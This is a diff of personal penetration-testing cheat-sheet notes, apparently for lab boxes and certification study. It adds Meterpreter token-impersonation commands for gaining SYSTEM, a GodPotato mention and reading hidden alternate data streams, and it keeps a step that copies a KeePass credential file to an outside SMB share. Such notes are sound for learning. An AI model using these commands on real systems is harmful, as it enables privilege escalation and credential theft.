@@ -321,7 +321,16 @@ set SRVHOST | PAYLOAD | LHOST | LPORT | TARGET then run
 copy any paste the payload into the cmd shell. you should have a new session
 after getting the meterpreter session run post/multi/recon/local_exploit_suggester
 use any of the suggested exploits and run it
-- use godpotato
+in the meterpreter shell type
+-     load incognito
+-     list_tokens -u
+-     impersonate_token "NT AUTHORITY\SYSTEM"
+use godpotato
+check Jeeves box FYR
+
+Alternate Data Stream (hidden files)
+ls -la is equal to dir /R in windows
+-     more < raman.txt:hidden.txt
 
 Copy a file from windows to Linux by setting up smb server
 setup the smbserver
@@ -329,7 +338,11 @@ setup the smbserver
 cd to the share
 -     cd \\10.10.16.13\raman
 -     cp c:\users\raman\raman.kdbx .
-- 
+
+5- Get System
+
+6- RunAs
+
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Platforms
 1. for Initial Access work on eJPT, This article and official content 
@@ -367,6 +380,7 @@ there is some mod if ls dir not work then apply use passive (to go in active mod
 -     ·mget * (# Download everything from current directory like zip, pdf, doc)
 send/put (# Send single file or upload shell command)
 after download files always use exiftool –u -a <filename> (Meta description for users)
+good practise if you can switch to binary (ASCII is defual)
 ·FTP version above 3.0 not exploitable
 
 Port 22 SSH:
